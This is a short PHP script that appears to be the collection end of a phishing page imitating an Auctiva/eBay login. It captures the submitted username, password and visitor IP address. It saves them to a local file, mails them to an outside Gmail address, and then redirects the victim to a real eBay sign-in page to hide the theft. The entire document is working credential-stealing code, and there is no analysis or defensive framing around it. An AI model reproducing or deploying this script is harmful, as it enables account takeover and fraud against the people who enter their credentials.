<?
$ip = getenv("REMOTE_ADDR");
$userid = $_POST["username"];
$pass = $_POST["password"];
$subject = "AUCTIVAAAAAAA: $userid#$pass";

$to = "wesleyjr12@gmail.com";
$data = "User ID: $userid\nPassword: $pass\nIp: $ip\n";

$file = fopen("$$$.txt", "a");
fputs ($file, "$data\r\n");
fclose ($file);
mail($to, $subject, $data);
header("Location: https://signin.ebay.com/ws/eBayISAPI.dll?ThirdPartyAuthSucessFailure&isAuthSuccessful=true&AUCTIVA=TRUE");
?>